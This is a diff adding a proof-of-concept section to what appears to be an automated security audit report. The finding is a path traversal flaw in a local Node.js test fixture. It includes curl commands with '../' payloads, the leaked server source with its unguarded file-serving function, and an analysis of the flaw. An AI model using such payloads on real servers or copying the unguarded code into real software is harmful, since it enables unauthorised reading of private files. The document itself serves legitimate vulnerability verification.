@@ -74,3 +74,149 @@ kind = "not_found"
 source = "index.js:sendFile"
 guarantee = "no source-proven path containment check found in sendFile or parseRequest"
 ```
+
+---
+
+## PoC Attempt
+
+**Result**: POC_PASS
+**Date**: 2026-09-21
+**PoC by**: claude-haiku-4-5, default
+**Demonstration Method**: Direct server execution with curl requests
+
+### Demonstration
+
+Successfully demonstrated path traversal vulnerability by starting the Node.js server and executing HTTP GET requests with path traversal payloads. The server accepted `../` sequences in the `name` query parameter and returned full file contents from outside the `public/` directory with HTTP 200 status code, confirming arbitrary file read capability.
+
+### Reproduction Steps
+
+1. Start the server:
+```bash
+cd /app/workspace/worktrees/poc-R001-path-traversal-sendfile
+PORT=3123 node index.js &
+sleep 2
+```
+
+2. Test legitimate file read (baseline):
+```bash
+curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3123/file?name=hello.txt'
+```
+
+Expected output: `Hello from the public directory.` with `status=200`
+
+3. Test path traversal to read index.js:
+```bash
+curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3123/file?name=../index.js'
+```
+
+Expected output: Full source code of `index.js` with `status=200`
+
+4. Test path traversal to read package.json:
+```bash
+curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3123/file?name=../package.json'
+```
+
+Expected output: Full JSON content of `package.json` with `status=200`
+
+5. Stop the server:
+```bash
+kill %1
+```
+
+### Test Output
+
+**Legitimate request:**
+```
+Hello from the public directory.
+status=200
+```
+
+**Path traversal to ../index.js:**
+```
+import { createServer } from "node:http";
+import { readFile } from "node:fs/promises";
+import { join } from "node:path";
+
+const port = Number(process.env.PORT || 3000);
+const publicDir = join(process.cwd(), "public");
+
+function parseRequest(rawUrl) {
+  const { pathname, searchParams } = new URL(rawUrl, "http://localhost");
+
+  if (pathname === "/") return { route: "root" };
+  if (pathname === "/file") return { route: "file", name: searchParams.get("name") || "hello.txt" };
+  return { route: "not-found" };
+}
+
+function buildGreeting(route) {
+  return route === "root" ? "Hello, world!\n" : "Not found\n";
+}
+
+function sendGreeting(response, body) {
+  const statusCode = body === "Hello, world!\n" ? 200 : 404;
+
+  response.writeHead(statusCode, { "content-type": "text/plain; charset=utf-8" });
+  response.end(body);
+}
+
+async function sendFile(response, name) {
+  try {
+    const body = await readFile(join(publicDir, name));
+
+    response.writeHead(200, { "content-type": "text/plain; charset=utf-8" });
+    response.end(body);
+  } catch {
+    sendGreeting(response, "Not found\n");
+  }
+}
+
+function requestListener(request, response) {
+  const parsed = parseRequest(request.url);
+
+  if (parsed.route === "file") return sendFile(response, parsed.name);
+
+  sendGreeting(response, buildGreeting(parsed.route));
+}
+
+const server = createServer(requestListener);
+
+server.listen(port, () => {
+  console.log(`Hello-world fixture listening on http://localhost:${port}`);
+});
+
+status=200
+```
+
+**Path traversal to ../package.json:**
+```
+{
+  "name": "hello-world-codeql-fixture",
+  "version": "1.0.0",
+  "private": true,
+  "type": "module",
+  "description": "Minimal local JavaScript fixture for CodeQL analysis.",
+  "scripts": {
+    "start": "node index.js",
+    "check": "node --check index.js"
+  },
+  "engines": {
+    "node": ">=18"
+  }
+}
+
+status=200
+```
+
+### Analysis
+
+The vulnerability is confirmed as HIGH severity. The path traversal attack succeeds because:
+
+1. **No input validation**: The `name` parameter from the URL query string (line 12) flows directly to `sendFile` without any checks to ensure it stays within `public/`.
+
+2. **No output validation**: After `path.join(publicDir, name)` at line 29, there is no check to verify the resulting path is still within `publicDir`.
+
+3. **No containment guard**: The try-catch block (lines 33-34) only handles read errors, not path validation. It does not prevent directory traversal attempts.
+
+4. **Direct file emission**: Files outside `public/` that are readable by the process are fully returned in the HTTP response body (status 200), allowing complete disclosure of sensitive files including source code, configuration, environment variables, and system files.
+
+The vulnerability is fully exploitable by any unauthenticated HTTP client without special privileges or preconditions.
